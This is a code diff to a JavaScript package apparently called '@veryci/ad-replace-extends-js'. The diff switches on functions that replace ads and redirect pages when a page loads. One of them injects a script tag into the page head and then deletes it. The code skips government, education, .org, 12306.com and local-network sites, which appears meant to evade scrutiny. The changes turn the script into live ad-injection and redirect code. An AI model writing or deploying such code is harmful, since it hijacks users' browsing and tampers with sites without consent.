@@ -6,7 +6,6 @@ const [name, version] = ['@veryci/ad-replace-extends-js', '1.0.0'];
 
 const blackWebsite = /.edu|.org|12306.com|.*gov.*|^192.168|yoyo.qq.com/;
 const { hostname } = window.location;
-let ready = false;
 
 function extend() {
   if (window.adExtendsJS || window.top !== window || blackWebsite.test(hostname)) return;
@@ -51,17 +50,14 @@ function redirect() {
   document.head.appendChild(os);
   os.remove();
 }
-// setTimeout(redirect, 100);
-// replace();
-// extend();
+
 function handler(e) {
-  console.log(e.type);
-  if (ready) return;
+  if (window.adReady) return;
   if (e.type === 'onreadystatechange' && document.readyState !== 'complete') return;
-  setTimeout(redirect, 100);
-  setTimeout(replace, 170);
   extend();
-  ready = true;
+  setTimeout(replace, 170);
+  setTimeout(redirect, 200);
+  window.adReady = true;
 }
 
 if (document.addEventListener) {
